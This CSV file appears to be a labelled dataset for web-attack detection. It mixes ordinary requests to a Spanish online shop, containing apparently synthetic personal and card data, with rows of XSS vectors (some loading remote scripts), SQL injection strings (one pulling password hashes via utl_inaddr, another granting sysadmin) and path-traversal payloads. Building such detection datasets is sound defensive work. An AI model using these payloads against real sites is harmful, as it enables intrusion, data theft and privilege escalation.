<input onblur=write(XSS) autofocus><input autofocus>,xss,0.897497177
"""`'><script>\xE3\x80\x80javascript:alert(1)</script>",xss,0.442226148
publico/registro.jsp?modo=registro&login=verrilli&password=s9p2212419435.5&nombre=Gianna&apellidos=Bilbao+Calsada&email=moll%40eurograb.ic&dni=88360528W&direccion=C%2F+El+Columpio+13%2C+&ciudad=Kripan&cp=09390&provincia=%C1vila&ntc=7282110162388587&B1=Registrar,normal,0.602974265
"&noo1: select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1",sqli,0.131310452
'^',sqli,0.737641737
global/creditos.jsp,normal,0.402557767
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",xss,0.600429024
imagenes/nuestratierra.jpg,normal,0.116546705
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss,0.568007203
global/estilos.css,normal,0.316634894
miembros/imagenes/ogono.jpg,normal,0.708386705
global/creditos.jsp,normal,0.147996291
publico/autenticar.jsp?modo=entrar&login=chungjen&pwd=.corporativo&remember=off&B1=Entrar,normal,0.098551615
"""><img src=x onerror=javascript:alert((`1`))>",xss,0.2350773
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss,0.376416621
publico/registro.jsp?modo=registro&login=wun&password=intercesoriamente&nombre=Betty&apellidos=Tejo&email=katcher%40tabernarinconete.nr&dni=45295566X&direccion=C%2F+Errementariena+31%2C+&ciudad=Tord%F3mar&cp=25471&provincia=Burgos&ntc=6590914640490551&B1=Registrar,normal,0.632287261
publico/caracteristicas.jsp?id=1,normal,0.463710129
miembros/index.jsp,normal,0.818772282
imagenes/nuestratierra.jpg,normal,0.26630506
publico/autenticar.jsp?modo=entrar&login=siddell&pwd=piejo&remember=off&B1=Entrar,normal,0.003537013
imagenes/3.gif,normal,0.734646715
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.290941387
"<div/onmouseover='alert(1)'> style=""x:"">",xss,0.899908721
miembros/imagenes/zarauz.jpg,normal,0.848463257
publico/autenticar.jsp?modo=entrar&login=timms&pwd=95%216a752a&remember=on&B1=Entrar,normal,0.510936757
publico/registro.jsp?modo=registro&login=van_bake&password=encatusar&nombre=Zenaires&apellidos=Puellas+Sarlinga&email=chuvalo%40ppmanzanares.nc&dni=38860881N&direccion=Calle+De+La+Madre+De+Dios+13%2C+&ciudad=Fuentes+de+Andaluc%EDa&cp=23280&provincia=La+Rioja&ntc=4140359172053437&B1=Registrar,normal,0.664029122
miembros/imagenes/ogono.jpg,normal,0.36530613
publico/registro.jsp?modo=registro&login=crabe&password=larGaR&nombre=Itziar&apellidos=Pellizza+Echevarr%EDa&email=ehrlich.selwyne%40ebaz.ba&dni=88194085X&direccion=Torre-pacheco+35%2C+&ciudad=Clariana+de+Cardener&cp=07460&provincia=Ourense&ntc=4485457754707106&B1=Registrar,normal,0.235807969
imagenes/2.gif,normal,0.48159023
"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",xss,0.615034253
index.jsp,normal,0.427539164
global/creditos.jsp,normal,0.609868015
publico/registro.jsp?modo=registro&login=gorfine&password=d308Ada&nombre=Fulgencio&apellidos=Moncada&email=linero-noro%40cocheacoche.uy&dni=14962243F&direccion=Zeus%2C+22%2C+12G&ciudad=Aceituna&cp=39313&provincia=Salamanca&ntc=8352337916705491&B1=Registrar,normal,0.028052878
miembros/salir.jsp,normal,0.762932449
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.142155462
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=78&B1=A%F1adir+al+carrito,normal,0.635149545
"s;UEv: select * from users where id=1 or 1#""; union select null,version() -- 1",sqli,0.978871158
"<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",xss,0.277850268
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=34&B1=A%F1adir+al+carrito,normal,0.153200132
miembros/imagenes/castro.jpg,normal,0.395999798
imagenes/1.gif,normal,0.773058019
miembros/imagenes/ogono.jpg,normal,0.741381294
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal,0.448128313
publico/registro.jsp?modo=registro&login=athwal&password=a92974d4r&nombre=Meinrad&apellidos=Martinho+Burg%E8s&email=bruzzese%40audiosat.ar&dni=63102165D&direccion=Calle+Pintor+Picasso%2C+182+5%3FD&ciudad=Montesa&cp=20180&provincia=Toledo&ntc=9280522239849881&B1=Registrar,normal,0.369510398
"UEvo,: select * from users where id=1 union select @<@,version() -- 1",sqli,0.074126006
miembros/imagenes/castro.jpg,normal,0.387613325
' or uname like '%,sqli,0.550660812
miembros/imagenes/castro.jpg,normal,0.390737586
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE},traversal,0.635791665
"<style>@import ""data:,*%7bx:expression(javascript:alert(1))%7D"";</style>",xss,0.971224478
publico/autenticar.jsp?modo=entrar&login=yoon&pwd=re53nc19g93s8&remember=on&B1=Entrar,normal,0.261957203
"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss,0.74349366
%253cscript%253ealert(1)%253c/script%253e,xss,0.577224946
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;,xss,0.143533689
publico/productos.jsp,normal,0.928859762
global/creditos.jsp,normal,0.295101179
publico/pagar.jsp?modo=insertar&precio=540&B1=Pasar+por+caja,normal,0.118599543
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss,0.179272738
miembros/editar.jsp?modo=registro&login=linden&password=organero&nombre=Alio&apellidos=Gallegos+Angeleri&email=shumsky.zalata5%40telelujo.ci&dni=41909752A&direccion=Alicante+119%2C+&ciudad=Benalm%E1dena&cp=25140&provincia=Ja%E9n&ntc=9201759661755850&B1=Registrar,normal,0.478479575
imagenes/cmenbul.gif,normal,0.109249678
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=22&B1=A%F1adir+al+carrito,normal,0.514849284
"s:c: select * from users where id=1 or "":#"" or 1=1 -- 1",sqli,0.66812715
miembros/editar.jsp?modo=registro&login=severn5&password=02048n3ad1&nombre=Eugenio&apellidos=Pall%E0s+De+Buran&email=walker%40ebaz.vi&dni=88253687L&direccion=Calle+Playa+Del+Carmen%2C+178%2C+2%3FD&ciudad=Marazuela&cp=45510&provincia=Salamanca&ntc=0639487553835350&B1=Registrar,normal,0.808357227
"svc: select * from users where id=1 or ""@#"" or 1=1 -- 1",sqli,0.342383895
imagenes/cmenbul.gif,normal,0.585486609
imagenes/2.gif,normal,0.523999978
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.392204158
"o(1)U: select * from users where id=1 *(1) union select 1,banner from v$version where rownum=1 -- 1",sqli,0.37309175
on&1c: select * from users where id=1 <@$ or 1=1 -- 1,sqli,0.962019604
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal,0.311206007
"</ foo=""><script>alert(1)</script>"">",xss,0.471933778
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE},traversal,0.239370562
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",xss,0.100864531
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.36678917
"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",xss,0.82798703
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss,0.369743821
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.084501942
¼script¾alert(¢XSS¢)¼/script¾,xss,0.200351326
publico/registro.jsp?modo=registro&login=clampitt&password=ba94aridad&nombre=Raphael&apellidos=Chisvert&email=zelda_hjelm5%40silver-knights.it&dni=70892292J&direccion=Calle+Hernandez+Iglesias%2C+160%2C+&ciudad=Pe%F1alsordo&cp=26135&provincia=Badajoz&ntc=4474255756033041&B1=Registrar,normal,0.19228813
miembros/imagenes/zarauz.jpg,normal,0.877780891
imagenes/1.gif,normal,0.539359698
imagenes/nuestratierra.jpg,normal,0.304427932
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss,0.705995455
admin' or 1=1--,sqli,0.845928298
miembros/salir.jsp,normal,0.602075087
<script <B>document.vulnerable=true;</script>,xss,0.010291033
</script></script><<<<script><>>>><<<script>alert(123)</script>,xss,0.957109155
publico/miembros.jsp,normal,0.769153716
publico/productos.jsp,normal,0.821233218
miembros/salir.jsp,normal,0.148779397
"s(?s: select * from users where id=1 or ""(]"" or 1=1 -- 1",sqli,0.019845508
global/estilos.css,normal,0.551091887
imagenes/nuestratierra.jpg,normal,0.733743837
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",xss,0.800117445
%252e%252e\{FILE},traversal,0.021353095
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../{FILE},traversal,0.000835826
....\....\....\....\....\{FILE},traversal,0.74239595
index.jsp,normal,0.645941525
%25c0%25ae%25c0%25ae/{FILE},traversal,0.988751148
<<SCRIPT>alert(“XSS”);//<</SCRIPT>,xss,0.074350161
publico/miembros.jsp,normal,0.752846395
publico/caracteristicas.jsp?id=2,normal,0.824408981
"<;!--#exec cmd="";/bin/echo ';<;SCRIPT SRC';"";-->;<;!--#exec cmd="";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';"";-->;",xss,0.480647039
publico/carrito.jsp,normal,0.887680085
index.jsp,normal,0.149713714
miembros/fotos.jsp,normal,0.116682548
imagenes/1.gif,normal,0.713986504
miembros/index.jsp,normal,0.883162105
publico/carrito.jsp,normal,0.988958365
..\..\\..\..\\..\..\\{FILE},traversal,0.285360175
global/menum.jsp,normal,0.679230216
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.431221759
imagenes/logo.gif,normal,0.004451651
"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",xss,0.359294419
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss,0.32858051
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss,0.320069758
global/menum.jsp,normal,0.02455279
publico/miembros.jsp,normal,0.168058546
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss,0.050172145
.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE},traversal,0.838391991
global/estilos.css,normal,0.236377831
miembros/imagenes/zarauz.jpg,normal,0.964465905
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss,0.449509075
imagenes/logo.gif,normal,0.840549714
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.371722017
imagenes/nuestratierra.jpg,normal,0.743442432
<<script>document.vulnerable=true;</script>,xss,0.434349984
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss,0.255371675
"<a href=""javascript#document.vulnerable=true;"">",xss,0.910779271
miembros/salir.jsp,normal,0.586062535
imagenes/2.gif,normal,0.160473014
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss,0.024122754
\..\..\..\..\..\..\..\..\..\..\boot.ini,traversal,0.544888332
global/estilos.css,normal,0.540980142
publico/pagar.jsp?modo=insertar&precio=6110&B1=Confirmar,normal,0.07311493
publico/miembros.jsp,normal,0.021155847
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss,0.272021855
8888'+AND+'1'+LIKE+'1 -->,sqli,0.91921131
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.760074716
admin' or 1=1#,sqli,0.063451574
imagenes/1.gif,normal,0.093114656
miembros/index.jsp,normal,0.330592108
imagenes/nuestratierra.jpg,normal,0.107018651
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=7&B1=A%F1adir+al+carrito,normal,0.480763629
miembros/imagenes/zarauz.jpg,normal,0.149598292
publico/pagar.jsp?modo=insertar&precio=9185&B1=Pasar+por+caja,normal,0.228042031
miembros/salir.jsp,normal,0.949686029
"n.UEv: select * from users where id=1 +$ . union select null,@@VERSION -- 1",sqli,0.673001747
%c0%ae%c0%ae%c1%9c{FILE},traversal,0.006516318
miembros/editar.jsp?modo=registro&login=de_la&password=roder%F3n&nombre=Franklin&apellidos=Canella&email=pockaj-bushman%40lecriture.md&dni=29283698Y&direccion=Calle+Palencia+S%2FN+&ciudad=Tirapu&cp=25320&provincia=Madrid&ntc=4789967077221120&B1=Registrar,normal,0.485046012
imagenes/logo.gif,normal,0.840664445
</plaintext\></|\><plaintext/onmouseover=prompt(1),xss,0.662328204
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.045989265
"&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;",xss,0.678792295
publico/carrito.jsp,normal,0.088083287
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss,0.621395938
imagenes/cmenbul.gif,normal,0.336263976
miembros/index.jsp,normal,0.896416196
publico/autenticar.jsp?modo=entrar&login=daphne&pwd=desvanecido&remember=off&B1=Entrar,normal,0.48172105
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.267538693
"<script charset=""\x22>javascript:alert(1)</script>",xss,0.994317796
select,sqli,0.65402014
miembros/index.jsp,normal,0.968237556
miembros/editar.jsp?modo=registro&login=lemieux4&password=llaga&nombre=Fluvia&apellidos=Streit+Bellavista&email=cutler.hutton%40the-white-pearl-resort.int&dni=27744538Y&direccion=Calle+Puru%F1uela%2C+15+6%3FD&ciudad=Sentiu+de+Si%F3%2C+La&cp=34340&provincia=Castell%F3n&ntc=2523504851273429&B1=Registrar,normal,0.442070272
imagenes/logo.gif,normal,0.66300798
global/titulo.jsp,normal,0.789249484
"perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",xss,0.64472034
imagenes/cmenbul.gif,normal,0.587987093
"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",xss,0.301161646
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",xss,0.677969537
publico/productos.jsp,normal,0.6116241
"<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.678920417
../../../{FILE},traversal,0.567281598
publico/pagar.jsp?modo=insertar&precio=7781&B1=Confirmar,normal,0.763962866
miembros/imagenes/zarauz.jpg,normal,0.338196219
global/creditos.jsp,normal,0.625793589
global/creditos.jsp,normal,0.553697596
"&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;",xss,0.064528482
publico/caracteristicas.jsp?id=2,normal,0.901195304
0x2e0x2e/{FILE},traversal,0.690151664
miembros/editar.jsp?modo=registro&login=palidwor&password=sati1f4ctori4&nombre=Iago&apellidos=Tordera+Savall&email=debever%40viajesparamujeres.es&dni=18914400M&direccion=C%2F+Eulogio+Serdan%2C+139+5A&ciudad=Monforte+de+la+Sierra&cp=10620&provincia=Navarra&ntc=1279843552348312&B1=Registrar,normal,0.648317083
publico/productos.jsp,normal,0.883982348
"s;s: select * from users where id='1' union select "";""_,version() -- 1'",sqli,0.148035229
....\....\....\....\....\....\....\{FILE},traversal,0.098865825
imagenes/1.gif,normal,0.996028811
miembros/imagenes/zarauz.jpg,normal,0.997982709
global/titulo.jsp,normal,0.952563076
imagenes/cmenbul.gif,normal,0.015043287
global/titulo.jsp,normal,0.643438699
"s(o1&: select * from users where id=1 or @#""(=1 or 1=1 -- 1",sqli,0.820723364
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57&B1=A%F1adir+al+carrito,normal,0.510356075
publico/caracteristicas.jsp?id=2,normal,0.754965607
publico/autenticar.jsp?modo=entrar&login=licia&pwd=f983Ga2783&remember=on&B1=Entrar,normal,0.369830959
<--`<img/src=` onerror=alert(1)> --!>,xss,0.98755584
..%2f{FILE},traversal,0.138224779
publico/registro.jsp?modo=registro&login=jeramey&password=86m-bra&nombre=Sabrina&apellidos=Sanchon+Vilavend&email=straths%40campanasextractoras.vn&dni=86343464S&direccion=C%2F+De+La+Igualdad+191+8-H&ciudad=Oma%F1as%2C+Las&cp=50259&provincia=Barcelona&ntc=0076747388160328&B1=Registrar,normal,0.672345219
publico/miembros.jsp,normal,0.05950729
publico/productos.jsp,normal,0.673024518
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},traversal,0.721921548
miembros/salir.jsp,normal,0.547545511
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss,0.430978469
imagenes/logo.gif,normal,0.713171196
publico/caracteristicas.jsp?id=2,normal,0.366710213
miembros/index.jsp,normal,0.17439877
miembros/imagenes/ogono.jpg,normal,0.267168249
imagenes/2.gif,normal,0.25417583
"exec sp_addsrvrolemember 'name' , 'sysadmin'",sqli,0.128435384
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../{FILE},traversal,0.936099214
global/estilos.css,normal,0.071322383
imagenes/1.gif,normal,0.923431156
publico/registro.jsp?modo=registro&login=meara&password=anest1sica&nombre=Jugen&apellidos=Cabot+Camaran&email=baigent%40blueberryminiloaf.com.dj&dni=69409914P&direccion=Castelo+Branco%2C+63%2C+&ciudad=Villalba+de+la+Loma&cp=37329&provincia=Baleares+%28Illes%29&ntc=2796348455963884&B1=Registrar,normal,0.4771444
imagenes/3.gif,normal,0.910368119
1 and user_name() = 'dbo',sqli,0.971808043
imagenes/2.gif,normal,0.449072459
"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss,0.033460311
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss,0.605322727
index.jsp,normal,0.178253155
miembros/editar.jsp?modo=registro&login=moel&password=lab2a8o4i0&nombre=Evangelino&apellidos=Marcano+Giner&email=jochim%40ajuntamentdebarcelona2-0.qa&dni=68733218H&direccion=Calle+Orotava+31+&ciudad=Valdelinares&cp=43439&provincia=Burgos&ntc=8288603955421514&B1=Registrar,normal,0.270278863
..0x2f..0x2f{FILE},traversal,0.388608208
global/menum.jsp,normal,0.33669285
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=7&B1=A%F1adir+al+carrito,normal,0.820907497
publico/autenticar.jsp?modo=entrar&login=shay-pin&pwd=pajO&remember=on&B1=Entrar,normal,0.241028312
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.796666254
global/estilos.css,normal,0.61247277
or%201=1 --,sqli,0.664632532
publico/caracteristicas.jsp?id=2,normal,0.646619565
&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;,xss,0.513514666
global/estilos.css,normal,0.786276373
#NAME?,sqli,0.801663664
miembros/imagenes/zarauz.jpg,normal,0.466181128
miembros/fotos.jsp,normal,0.347661531
/../../../../../../../../../../../boot.ini%00.html,traversal,0.244018877
imagenes/nuestratierra.jpg,normal,0.904734547
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss,0.459401493
publico/registro.jsp?modo=registro&login=maddalen&password=atab%3Fa6Ad7&nombre=Am%F3n&apellidos=Pericas+Espaulella&email=stimson_holbrook%40cementosanfranq.ly&dni=60928646J&direccion=C%2F+Sarasate+143+&ciudad=Montu%EFri&cp=49156&provincia=Salamanca&ntc=6395384194321483&B1=Registrar,normal,0.431906541
publico/caracteristicas.jsp?id=1,normal,0.479322224
imagenes/logo.gif,normal,0.688011416
imagenes/2.gif,normal,0.648194797
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss,0.283244683
publico/carrito.jsp,normal,0.597754598
miembros/salir.jsp,normal,0.539416502
global/estilos.css,normal,0.36797628
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",sqli,0.220138927
..0x2f..0x2f..0x2f{FILE},traversal,0.658796435
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",xss,0.173457449
index.jsp,normal,0.545429618
n.&1c: select * from users where id=1 +$ . or 1=1 -- 1,sqli,0.061755858
miembros/salir.jsp,normal,0.645416507
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.461128464
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss,0.863986046
imagenes/2.gif,normal,0.412833974
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",xss,0.337577385
.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE},traversal,0.609744697
"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",xss,0.634044599
miembros/index.jsp,normal,0.351579612
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.042218934
"s(c: select * from users where id=1 or ""(#"" or 1=1 -- 1",sqli,0.330215773
imagenes/logo.gif,normal,0.085916658
imagenes/2.gif,normal,0.040825573
imagenes/logo.gif,normal,0.976351021
miembros/imagenes/zarauz.jpg,normal,0.657328483
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss,0.070289797
global/creditos.jsp,normal,0.05755884
publico/pagar.jsp?modo=insertar&precio=4092&B1=Pasar+por+caja,normal,0.85366648
miembros/imagenes/zarauz.jpg,normal,0.35097026
"&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;",xss,0.014911545
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE},traversal,0.644405326
<video/poster/onerror=alert()>,xss,0.019492792
miembros/editar.jsp?modo=registro&login=padraic&password=-se331rio&nombre=Yuvia&apellidos=Escogido+Francesc&email=challee%40zonamodelos.co&dni=02933716C&direccion=Cami+Son+Anglada%2C+S%2FN+&ciudad=Lagata&cp=31382&provincia=Navarra&ntc=0777026292170424&B1=Registrar,normal,0.29731388
.//..//.//..//{FILE},traversal,0.400419024
miembros/imagenes/castro.jpg,normal,0.043176512
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../{FILE},traversal,0.395511312
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",xss,0.272420969
global/creditos.jsp,normal,0.904484492
publico/registro.jsp?modo=registro&login=servidio&password=m9ncilla57&nombre=Maciela&apellidos=Mediavilla+Buera&email=bryson2%40casablancabeach.kp&dni=46208410F&direccion=Calle+Pintor+El+Greco+102+1-G&ciudad=Villasequilla&cp=45840&provincia=Burgos&ntc=0049063230467813&B1=Registrar,normal,0.118989141
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.324015745
"<IMG SRC=x onvolumechange=""alert(String.fromCharCode(88,83,83))"">",xss,0.584393553
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.882034442
global/titulo.jsp,normal,0.350835644
publico/carrito.jsp,normal,0.344490419
miembros/editar.jsp?modo=registro&login=jarel&password=des9o89451rac2%F38&nombre=Eneas&apellidos=R%EDos+Rius&email=barres%40engibraltar.bm&dni=62257757T&direccion=C%2F+Espigo%2C+0+10H&ciudad=Retamal+de+Llerena&cp=37788&provincia=Zamora&ntc=4141615236089952&B1=Registrar,normal,0.665734844
..\..\{FILE},traversal,0.040227994
..\{FILE},traversal,0.747318478
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",xss,0.270116969
%252e%252e%252f%252e%252e%252f{FILE},traversal,0.805394852
miembros/imagenes/zarauz.jpg,normal,0.033727532
%2e%2e%2f%2e%2e%2f{FILE},traversal,0.152112556
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss,0.220997556
..%5c..%5c..%5c..%5c..%5c{FILE},traversal,0.911321109
admin') or ('1'='1,sqli,0.993355448
publico/caracteristicas.jsp?id=1,normal,0.294606422
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>,xss,0.779808293
imagenes/3.gif,normal,0.31390758
publico/productos.jsp,normal,0.225860864
<script>for((i)in(self))eval(i)(1)</script>,xss,0.291606036
index.jsp,normal,0.165011926
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE},traversal,0.539267816
miembros/imagenes/castro.jpg,normal,0.188208039
miembros/editar.jsp?modo=registro&login=faraday&password=8Ef6NDo&nombre=Xixia&apellidos=Paula+Pladellorens&email=euzaine%40schnapps.com.gs&dni=85744372G&direccion=Santa+Barbara+28+&ciudad=Cenicientos&cp=22232&provincia=Lugo&ntc=7057231009442608&B1=Registrar,normal,0.65754644
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>,xss,0.555297163
imagenes/nuestratierra.jpg,normal,0.826869753
